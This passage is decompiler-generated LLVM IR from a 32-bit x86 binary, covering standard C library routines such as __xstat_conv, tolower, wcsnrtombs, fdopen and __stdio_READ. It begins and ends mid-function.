  %v4_806155d = zext i16 %v3_806155d to i32
  store i32 %v4_806155d, i32* %eax.global-to-local, align 4
  %v0_8061561 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061561 = add i32 %v0_8061561, 36
  %v2_8061561 = inttoptr i32 %v1_8061561 to i32*
  store i32 0, i32* %v2_8061561, align 4
  %v0_8061568 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061568 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061568 = add i32 %v1_8061568, 32
  %v3_8061568 = inttoptr i32 %v2_8061568 to i32*
  store i32 %v0_8061568, i32* %v3_8061568, align 4
  %v0_806156b = load i32, i32* %esi.global-to-local, align 4
  %v1_806156b = add i32 %v0_806156b, 44
  %v2_806156b = inttoptr i32 %v1_806156b to i32*
  %v3_806156b = load i32, i32* %v2_806156b, align 4
  store i32 %v3_806156b, i32* %eax.global-to-local, align 4
  %v1_806156e = add i32 %v0_806156b, 48
  %v2_806156e = inttoptr i32 %v1_806156e to i32*
  %v3_806156e = load i32, i32* %v2_806156e, align 4
  %v1_8061571 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061571 = add i32 %v1_8061571, 48
  %v3_8061571 = inttoptr i32 %v2_8061571 to i32*
  store i32 %v3_806156e, i32* %v3_8061571, align 4
  %v0_8061574 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061574 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061574 = add i32 %v1_8061574, 44
  %v3_8061574 = inttoptr i32 %v2_8061574 to i32*
  store i32 %v0_8061574, i32* %v3_8061574, align 4
  %v0_8061577 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061577 = add i32 %v0_8061577, 52
  %v2_8061577 = inttoptr i32 %v1_8061577 to i32*
  %v3_8061577 = load i32, i32* %v2_8061577, align 4
  store i32 %v3_8061577, i32* %eax.global-to-local, align 4
  %v1_806157a = load i32, i32* %ebx.global-to-local, align 4
  %v2_806157a = add i32 %v1_806157a, 52
  %v3_806157a = inttoptr i32 %v2_806157a to i32*
  store i32 %v3_8061577, i32* %v3_806157a, align 4
  %v0_806157d = load i32, i32* %esi.global-to-local, align 4
  %v1_806157d = add i32 %v0_806157d, 56
  %v2_806157d = inttoptr i32 %v1_806157d to i32*
  %v3_806157d = load i32, i32* %v2_806157d, align 4
  store i32 %v3_806157d, i32* %eax.global-to-local, align 4
  %v0_8061580 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061580 = add i32 %v0_8061580, 60
  %v2_8061580 = inttoptr i32 %v1_8061580 to i32*
  store i32 0, i32* %v2_8061580, align 4
  %v0_8061587 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061587 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061587 = add i32 %v1_8061587, 56
  %v3_8061587 = inttoptr i32 %v2_8061587 to i32*
  store i32 %v0_8061587, i32* %v3_8061587, align 4
  %v0_806158a = load i32, i32* %esi.global-to-local, align 4
  %v1_806158a = add i32 %v0_806158a, 64
  %v2_806158a = inttoptr i32 %v1_806158a to i32*
  %v3_806158a = load i32, i32* %v2_806158a, align 4
  store i32 %v3_806158a, i32* %eax.global-to-local, align 4
  %v1_806158d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806158d = add i32 %v1_806158d, 64
  %v3_806158d = inttoptr i32 %v2_806158d to i32*
  store i32 %v3_806158a, i32* %v3_806158d, align 4
  %v0_8061590 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061590 = add i32 %v0_8061590, 72
  %v2_8061590 = inttoptr i32 %v1_8061590 to i32*
  %v3_8061590 = load i32, i32* %v2_8061590, align 4
  store i32 %v3_8061590, i32* %eax.global-to-local, align 4
  %v1_8061593 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061593 = add i32 %v1_8061593, 72
  %v3_8061593 = inttoptr i32 %v2_8061593 to i32*
  store i32 %v3_8061590, i32* %v3_8061593, align 4
  %v0_8061596 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061596 = add i32 %v0_8061596, 80
  %v2_8061596 = inttoptr i32 %v1_8061596 to i32*
  %v3_8061596 = load i32, i32* %v2_8061596, align 4
  store i32 %v3_8061596, i32* %eax.global-to-local, align 4
  %v1_8061599 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061599 = add i32 %v1_8061599, 80
  %v3_8061599 = inttoptr i32 %v2_8061599 to i32*
  store i32 %v3_8061596, i32* %v3_8061599, align 4
  %v2_806159f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_806159f, i32* %ebx.global-to-local, align 4
  ret i32 %v3_8061596
}

define i32 @__xstat_conv(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80615a3 = load i32, i32* @ebx, align 4
  store i32 %v0_80615a3, i32* %stack_var_-8, align 4
  %v4_80615a7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80615a7, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_80615b4 = inttoptr i32 %arg2 to i8*
  %v4_80615b4 = call i32 @__GI_memset(i8* %v3_80615b4, i32 0, i32 88)
  store i32 %v4_80615b4, i32* %eax.global-to-local, align 4
  %v2_80615b9 = load i16, i16* %arg1, align 2
  %v3_80615b9 = zext i16 %v2_80615b9 to i32
  store i32 %v3_80615b9, i32* %eax.global-to-local, align 4
  %v0_80615bc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80615bc = add i32 %v0_80615bc, 4
  %v2_80615bc = inttoptr i32 %v1_80615bc to i32*
  store i32 0, i32* %v2_80615bc, align 4
  %v0_80615c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80615c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615c3 = inttoptr i32 %v1_80615c3 to i32*
  store i32 %v0_80615c3, i32* %v2_80615c3, align 4
  %v0_80615c5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80615c5 = add i32 %v0_80615c5, 4
  %v2_80615c5 = inttoptr i32 %v1_80615c5 to i32*
  %v3_80615c5 = load i32, i32* %v2_80615c5, align 4
  store i32 %v3_80615c5, i32* %eax.global-to-local, align 4
  %v1_80615c8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615c8 = add i32 %v1_80615c8, 12
  %v3_80615c8 = inttoptr i32 %v2_80615c8 to i32*
  store i32 %v3_80615c5, i32* %v3_80615c8, align 4
  %v0_80615cb = load i32, i32* %esi.global-to-local, align 4
  %v1_80615cb = add i32 %v0_80615cb, 8
  %v2_80615cb = inttoptr i32 %v1_80615cb to i16*
  %v3_80615cb = load i16, i16* %v2_80615cb, align 2
  %v4_80615cb = zext i16 %v3_80615cb to i32
  store i32 %v4_80615cb, i32* %eax.global-to-local, align 4
  %v1_80615cf = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615cf = add i32 %v1_80615cf, 16
  %v3_80615cf = inttoptr i32 %v2_80615cf to i32*
  store i32 %v4_80615cb, i32* %v3_80615cf, align 4
  %v0_80615d2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80615d2 = add i32 %v0_80615d2, 10
  %v2_80615d2 = inttoptr i32 %v1_80615d2 to i16*
  %v3_80615d2 = load i16, i16* %v2_80615d2, align 2
  %v4_80615d2 = zext i16 %v3_80615d2 to i32
  store i32 %v4_80615d2, i32* %eax.global-to-local, align 4
  %v1_80615d6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615d6 = add i32 %v1_80615d6, 20
  %v3_80615d6 = inttoptr i32 %v2_80615d6 to i32*
  store i32 %v4_80615d2, i32* %v3_80615d6, align 4
  %v0_80615d9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80615d9 = add i32 %v0_80615d9, 12
  %v2_80615d9 = inttoptr i32 %v1_80615d9 to i16*
  %v3_80615d9 = load i16, i16* %v2_80615d9, align 2
  %v4_80615d9 = zext i16 %v3_80615d9 to i32
  store i32 %v4_80615d9, i32* %eax.global-to-local, align 4
  %v1_80615dd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615dd = add i32 %v1_80615dd, 24
  %v3_80615dd = inttoptr i32 %v2_80615dd to i32*
  store i32 %v4_80615d9, i32* %v3_80615dd, align 4
  %v0_80615e0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80615e0 = add i32 %v0_80615e0, 14
  %v2_80615e0 = inttoptr i32 %v1_80615e0 to i16*
  %v3_80615e0 = load i16, i16* %v2_80615e0, align 2
  %v4_80615e0 = zext i16 %v3_80615e0 to i32
  store i32 %v4_80615e0, i32* %eax.global-to-local, align 4
  %v1_80615e4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615e4 = add i32 %v1_80615e4, 28
  %v3_80615e4 = inttoptr i32 %v2_80615e4 to i32*
  store i32 %v4_80615e0, i32* %v3_80615e4, align 4
  %v0_80615e7 = load i32, i32* %esi.global-to-local, align 4
  %v1_80615e7 = add i32 %v0_80615e7, 16
  %v2_80615e7 = inttoptr i32 %v1_80615e7 to i16*
  %v3_80615e7 = load i16, i16* %v2_80615e7, align 2
  %v4_80615e7 = zext i16 %v3_80615e7 to i32
  store i32 %v4_80615e7, i32* %eax.global-to-local, align 4
  %v0_80615eb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80615eb = add i32 %v0_80615eb, 36
  %v2_80615eb = inttoptr i32 %v1_80615eb to i32*
  store i32 0, i32* %v2_80615eb, align 4
  %v0_80615f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80615f2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615f2 = add i32 %v1_80615f2, 32
  %v3_80615f2 = inttoptr i32 %v2_80615f2 to i32*
  store i32 %v0_80615f2, i32* %v3_80615f2, align 4
  %v0_80615f5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80615f5 = add i32 %v0_80615f5, 20
  %v2_80615f5 = inttoptr i32 %v1_80615f5 to i32*
  %v3_80615f5 = load i32, i32* %v2_80615f5, align 4
  store i32 %v3_80615f5, i32* %eax.global-to-local, align 4
  %v1_80615f8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615f8 = add i32 %v1_80615f8, 44
  %v3_80615f8 = inttoptr i32 %v2_80615f8 to i32*
  store i32 %v3_80615f5, i32* %v3_80615f8, align 4
  %v0_80615fb = load i32, i32* %esi.global-to-local, align 4
  %v1_80615fb = add i32 %v0_80615fb, 24
  %v2_80615fb = inttoptr i32 %v1_80615fb to i32*
  %v3_80615fb = load i32, i32* %v2_80615fb, align 4
  store i32 %v3_80615fb, i32* %eax.global-to-local, align 4
  %v1_80615fe = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615fe = add i32 %v1_80615fe, 48
  %v3_80615fe = inttoptr i32 %v2_80615fe to i32*
  store i32 %v3_80615fb, i32* %v3_80615fe, align 4
  %v0_8061601 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061601 = add i32 %v0_8061601, 28
  %v2_8061601 = inttoptr i32 %v1_8061601 to i32*
  %v3_8061601 = load i32, i32* %v2_8061601, align 4
  store i32 %v3_8061601, i32* %eax.global-to-local, align 4
  %v1_8061604 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061604 = add i32 %v1_8061604, 52
  %v3_8061604 = inttoptr i32 %v2_8061604 to i32*
  store i32 %v3_8061601, i32* %v3_8061604, align 4
  %v0_8061607 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061607 = add i32 %v0_8061607, 32
  %v2_8061607 = inttoptr i32 %v1_8061607 to i32*
  %v3_8061607 = load i32, i32* %v2_8061607, align 4
  store i32 %v3_8061607, i32* %eax.global-to-local, align 4
  %v1_806160a = load i32, i32* %ebx.global-to-local, align 4
  %v2_806160a = add i32 %v1_806160a, 56
  %v3_806160a = inttoptr i32 %v2_806160a to i32*
  store i32 %v3_8061607, i32* %v3_806160a, align 4
  %v0_806160d = load i32, i32* %esi.global-to-local, align 4
  %v1_806160d = add i32 %v0_806160d, 40
  %v2_806160d = inttoptr i32 %v1_806160d to i32*
  %v3_806160d = load i32, i32* %v2_806160d, align 4
  store i32 %v3_806160d, i32* %eax.global-to-local, align 4
  %v1_8061610 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061610 = add i32 %v1_8061610, 64
  %v3_8061610 = inttoptr i32 %v2_8061610 to i32*
  store i32 %v3_806160d, i32* %v3_8061610, align 4
  %v0_8061613 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061613 = add i32 %v0_8061613, 48
  %v2_8061613 = inttoptr i32 %v1_8061613 to i32*
  %v3_8061613 = load i32, i32* %v2_8061613, align 4
  store i32 %v3_8061613, i32* %eax.global-to-local, align 4
  %v1_8061616 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061616 = add i32 %v1_8061616, 72
  %v3_8061616 = inttoptr i32 %v2_8061616 to i32*
  store i32 %v3_8061613, i32* %v3_8061616, align 4
  %v2_806161c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_806161c, i32* @ebx, align 4
  ret i32 %v3_8061613
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8061624 = add i32 %arg1, 128
  %v6_806162f = icmp ugt i32 %v1_8061624, 383
  br i1 %v6_806162f, label %dec_label_pc_806163a, label %dec_label_pc_8061631

dec_label_pc_8061631:                             ; preds = %entry
  %v0_8061631 = load i32, i32* bitcast (i32** @global_var_8073fd4.745 to i32*), align 4
  %v2_8061636 = mul i32 %arg1, 2
  %v3_8061636 = add i32 %v0_8061631, %v2_8061636
  %v4_8061636 = inttoptr i32 %v3_8061636 to i16*
  %v5_8061636 = load i16, i16* %v4_8061636, align 2
  %v6_8061636 = sext i16 %v5_8061636 to i32
  store i32 %v6_8061636, i32* @edx, align 4
  br label %dec_label_pc_806163a

dec_label_pc_806163a:                             ; preds = %entry, %dec_label_pc_8061631
  %v0_806163a = phi i32 [ %arg1, %entry ], [ %v6_8061636, %dec_label_pc_8061631 ]
  ret i32 %v0_806163a

; uselistorder directives
  uselistorder label %dec_label_pc_806163a, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_807a668.700 to i32)

; uselistorder directives
  uselistorder i32* @global_var_807a668.700, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8061653 = icmp eq i32 %tmp5, 0
  %v1_8061655 = icmp eq i1 %v1_8061653, false
  br i1 %v1_8061655, label %dec_label_pc_806165d, label %dec_label_pc_8061657

dec_label_pc_8061657:                             ; preds = %entry
  %v2_8061657 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_806165d

dec_label_pc_806165d:                             ; preds = %entry, %dec_label_pc_8061657
  %v0_8061679 = phi i32 [ %tmp5, %entry ], [ %v2_8061657, %dec_label_pc_8061657 ]
  %v0_8061661 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_8061657 ]
  %v2_806165d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8061661, i32* %stack_var_-4, align 4
  store i32 %v2_806165d, i32* %stack_var_-8, align 4
  %v2_8061674 = ptrtoint i32* %stack_var_-8 to i32
  %v5_806167a = inttoptr i32 %v0_8061679 to i8*
  %v6_806167a = call i32 @__GI_wcsnrtombs(i8* %v5_806167a, i32 %v2_8061674, i32 1, i32 16, i32 %tmp)
  %v1_8061682 = icmp eq i32 %v6_806167a, 0
  %v1_8061684 = icmp eq i1 %v1_8061682, false
  br i1 %v1_8061684, label %dec_label_pc_8061688, label %dec_label_pc_8061686

dec_label_pc_8061686:                             ; preds = %dec_label_pc_806165d
  %v1_8061686 = and i32 %v6_806167a, -256
  %v2_8061686 = or i32 %v1_8061686, 1
  br label %dec_label_pc_8061688

dec_label_pc_8061688:                             ; preds = %dec_label_pc_806165d, %dec_label_pc_8061686
  %v0_806168b = phi i32 [ %v6_806167a, %dec_label_pc_806165d ], [ %v2_8061686, %dec_label_pc_8061686 ]
  ret i32 %v0_806168b

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8061688, { 1, 0 }
  uselistorder label %dec_label_pc_806165d, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_80616a1 = inttoptr i32 %tmp to i8*
  %v6_80616a1 = call i32 @__GI_wcsnrtombs(i8* %v5_80616a1, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_80616a1
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80616af = load i32, i32* @ebx, align 4
  %v4_80616b3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80616b3, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_80616bf = icmp eq i8* %arg1, null
  br i1 %v1_80616bf, label %dec_label_pc_80616ce, label %dec_label_pc_80616c3

dec_label_pc_80616c3:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_80616c8 = icmp eq i32 %v4_80616b3, %arg2
  %v1_80616ca = icmp eq i1 %v12_80616c8, false
  br i1 %v1_80616ca, label %dec_label_pc_80616f3, label %dec_label_pc_80616ed

dec_label_pc_80616ce:                             ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80616d0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80616d0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80616f3

dec_label_pc_80616d9:                             ; preds = %dec_label_pc_8061704
  %v1_80616d9 = call i32 @__errno_location(i32 %v0_80616af)
  store i32 %v1_80616d9, i32* %eax.global-to-local, align 4
  %v1_80616de = inttoptr i32 %v1_80616d9 to i32*
  store i32 84, i32* %v1_80616de, align 4
  br label %dec_label_pc_806172a

dec_label_pc_80616e9:                             ; preds = %dec_label_pc_806170b
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_806171f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806171b

dec_label_pc_80616ed:                             ; preds = %dec_label_pc_80616c3
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80616ef = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80616ef, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80616f3

dec_label_pc_80616f3:                             ; preds = %dec_label_pc_80616c3, %dec_label_pc_80616ce, %dec_label_pc_80616ed
  %v2_806170b15 = phi i32 [ %v4_80616b3, %dec_label_pc_80616c3 ], [ %v2_80616d0, %dec_label_pc_80616ce ], [ %v2_80616ef, %dec_label_pc_80616ed ]
  %v0_80616fb = phi i32 [ %arg4, %dec_label_pc_80616c3 ], [ -1, %dec_label_pc_80616ce ], [ %arg4, %dec_label_pc_80616ed ]
  %tmp = icmp ult i32 %v0_80616fb, %arg3
  br i1 %tmp, label %dec_label_pc_80616fb, label %dec_label_pc_80616fd

dec_label_pc_80616fb:                             ; preds = %dec_label_pc_80616f3
  br label %dec_label_pc_80616fd

dec_label_pc_80616fd:                             ; preds = %dec_label_pc_80616f3, %dec_label_pc_80616fb
  %storemerge31 = phi i32 [ %v0_80616fb, %dec_label_pc_80616fb ], [ %arg3, %dec_label_pc_80616f3 ]
  %v0_8061700 = phi i32 [ %v0_80616fb, %dec_label_pc_80616fb ], [ %arg3, %dec_label_pc_80616f3 ]
  store i32 %storemerge31, i32* %ebx.global-to-local, align 4
  %v1_80616fd = inttoptr i32 %arg2 to i32*
  %v2_80616fd = load i32, i32* %v1_80616fd, align 4
  store i32 %v2_80616fd, i32* %esi.global-to-local, align 4
  store i32 %v0_8061700, i32* @ecx, align 4
  %v1_80617173 = icmp eq i32 %v0_8061700, 0
  %v1_806171910 = icmp eq i1 %v1_80617173, false
  br i1 %v1_806171910, label %dec_label_pc_8061704, label %dec_label_pc_806171b

dec_label_pc_8061704:                             ; preds = %dec_label_pc_80616fd, %dec_label_pc_8061711
  %v2_806170b = phi i32 [ %v2_8061714, %dec_label_pc_8061711 ], [ %v2_806170b15, %dec_label_pc_80616fd ]
  %v0_8061704 = phi i32 [ %v1_8061711, %dec_label_pc_8061711 ], [ %v2_80616fd, %dec_label_pc_80616fd ]
  %v1_8061704 = inttoptr i32 %v0_8061704 to i32*
  %v2_8061704 = load i32, i32* %v1_8061704, align 4
  store i32 %v2_8061704, i32* %eax.global-to-local, align 4
  %v6_8061709 = icmp ugt i32 %v2_8061704, 127
  br i1 %v6_8061709, label %dec_label_pc_80616d9, label %dec_label_pc_806170b

dec_label_pc_806170b:                             ; preds = %dec_label_pc_8061704
  %v1_806170b = trunc i32 %v2_8061704 to i8
  %v3_806170b = inttoptr i32 %v2_806170b to i8*
  store i8 %v1_806170b, i8* %v3_806170b, align 1
  %v0_806170d = load i32, i32* %eax.global-to-local, align 4
  %v3_806170d = trunc i32 %v0_806170d to i8
  %v4_806170d = icmp eq i8 %v3_806170d, 0
  br i1 %v4_806170d, label %dec_label_pc_80616e9, label %dec_label_pc_8061711

dec_label_pc_8061711:                             ; preds = %dec_label_pc_806170b
  %v0_8061711 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061711 = add i32 %v0_8061711, 4
  store i32 %v1_8061711, i32* %esi.global-to-local, align 4
  %v0_8061714 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061714 = load i32, i32* %edi.global-to-local, align 4
  %v2_8061714 = add i32 %v1_8061714, %v0_8061714
  store i32 %v2_8061714, i32* %edx.global-to-local, align 4
  %v0_8061716 = load i32, i32* @ecx, align 4
  %v1_8061716 = add i32 %v0_8061716, -1
  %v8_8061716 = icmp eq i32 %v1_8061716, 0
  store i32 %v1_8061716, i32* @ecx, align 4
  %v1_8061719 = icmp eq i1 %v8_8061716, false
  br i1 %v1_8061719, label %dec_label_pc_8061704, label %dec_label_pc_806171b

dec_label_pc_806171b:                             ; preds = %dec_label_pc_8061711, %dec_label_pc_80616fd, %dec_label_pc_80616e9
  %v0_8061723 = phi i32 [ 0, %dec_label_pc_80616e9 ], [ %v2_80616fd, %dec_label_pc_80616fd ], [ %v1_8061711, %dec_label_pc_8061711 ]
  %v0_806171f = phi i32 [ %v0_806171f.pre, %dec_label_pc_80616e9 ], [ %v2_806170b15, %dec_label_pc_80616fd ], [ %v2_8061714, %dec_label_pc_8061711 ]
  %v2_806171b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_806171b, i32* %eax.global-to-local, align 4
  %v12_806171f = icmp eq i32 %v0_806171f, %v2_806171b
  br i1 %v12_806171f, label %dec_label_pc_8061726, label %dec_label_pc_8061723

dec_label_pc_8061723:                             ; preds = %dec_label_pc_806171b
  %v1_8061723 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8061723 = inttoptr i32 %v1_8061723 to i32*
  store i32 %v0_8061723, i32* %v2_8061723, align 4
  br label %dec_label_pc_8061726

dec_label_pc_8061726:                             ; preds = %dec_label_pc_806171b, %dec_label_pc_8061723
  %v0_8061726 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8061726, i32* %eax.global-to-local, align 4
  %v1_8061728 = load i32, i32* @ecx, align 4
  %v2_8061728 = sub i32 %v0_8061726, %v1_8061728
  br label %dec_label_pc_806172a

dec_label_pc_806172a:                             ; preds = %dec_label_pc_80616d9, %dec_label_pc_8061726
  %storemerge1 = phi i32 [ -1, %dec_label_pc_80616d9 ], [ %v2_8061728, %dec_label_pc_8061726 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_80616af, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_8061714, { 0, 2, 1 }
  uselistorder i32 %v1_8061711, { 0, 2, 1 }
  uselistorder i32 %v2_80616fd, { 1, 0, 2 }
  uselistorder i32 %v0_8061700, { 1, 0 }
  uselistorder i32 %v2_806170b15, { 1, 0 }
  uselistorder i32 %v4_80616b3, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 6, 2, 3, 7, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806172a, { 1, 0 }
  uselistorder label %dec_label_pc_8061726, { 1, 0 }
  uselistorder label %dec_label_pc_8061704, { 1, 0 }
  uselistorder label %dec_label_pc_80616fd, { 1, 0 }
  uselistorder label %dec_label_pc_80616f3, { 2, 1, 0 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8061734 = load i32, i32* @ebx, align 4
  store i32 %v0_8061734, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_806173f = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 %tmp11)
  store i32 %v3_806173f, i32* @eax, align 4
  %v10_8061749 = icmp eq i32 %v3_806173f, -1
  br i1 %v10_8061749, label %dec_label_pc_8061760, label %dec_label_pc_806174e

dec_label_pc_806174e:                             ; preds = %entry
  %v0_806174e = load i32, i32* @ebx, align 4
  %v4_8061756 = inttoptr i32 %arg2 to i8*
  %v5_8061756 = call i32 @_stdio_fopen(i32 %v3_806173f, i8* %v4_8061756, i32 0, i32 %v0_806174e)
  br label %dec_label_pc_8061760

dec_label_pc_8061760:                             ; preds = %entry, %dec_label_pc_806174e
  %v0_8061760 = phi i32 [ 0, %entry ], [ %v5_8061756, %dec_label_pc_806174e ]
  %v2_8061764 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061764, i32* @ebx, align 4
  ret i32 %v0_8061760

; uselistorder directives
  uselistorder i32 %v3_806173f, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061760, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061768 = load i32, i32* @ebx, align 4
  store i32 %v0_8061768, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_806176e = ptrtoint i16* %arg1 to i32
  store i32 %v4_806176e, i32* @ebx, align 4
  %v1_8061776 = bitcast i16* %arg1 to i8*
  %v2_8061776 = load i8, i8* %v1_8061776, align 1
  %v3_8061776 = and i8 %v2_8061776, 4
  %v4_8061776 = icmp eq i8 %v3_8061776, 0
  %v1_8061779 = icmp eq i1 %v4_8061776, false
  br i1 %v1_8061779, label %dec_label_pc_80617a8, label %dec_label_pc_806177b

dec_label_pc_806177b:                             ; preds = %entry
  %v2_806177b = icmp slt i32 %arg3, 0
  %v1_806177d = icmp eq i1 %v2_806177b, false
  br i1 %v1_806177d, label %dec_label_pc_8061784, label %dec_label_pc_806177f

dec_label_pc_806177f:                             ; preds = %dec_label_pc_806177b
  br label %dec_label_pc_8061784

dec_label_pc_8061784:                             ; preds = %dec_label_pc_806177b, %dec_label_pc_806177f
  %v0_8061785 = phi i32 [ %arg3, %dec_label_pc_806177b ], [ 2147483647, %dec_label_pc_806177f ]
  %v1_806178a = add i32 %v4_806176e, 4
  %v2_806178a = inttoptr i32 %v1_806178a to i32*
  %v3_806178a = load i32, i32* %v2_806178a, align 4
  %v3_806178d = call i32 @__libc_read(i32 %v3_806178a, i32 %arg2, i32 %v0_8061785)
  store i32 %v3_806178d, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v3_806178d, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80617a8, label %dec_label_pc_806179a

dec_label_pc_806179a:                             ; preds = %dec_label_pc_8061784
  %v1_8061795 = icmp eq i32 %v3_806178d, 0
  %v4_8061798 = icmp eq i1 %v1_8061795, false
  %v0_80617a2 = load i32, i32* @ebx, align 4
  %v1_80617a2 = inttoptr i32 %v0_80617a2 to i16*
  %v2_80617a2 = load i16, i16* %v1_80617a2, align 2
  br i1 %v4_8061798, label %dec_label_pc_80617a2, label %dec_label_pc_806179c

dec_label_pc_806179c:                             ; preds = %dec_label_pc_806179a
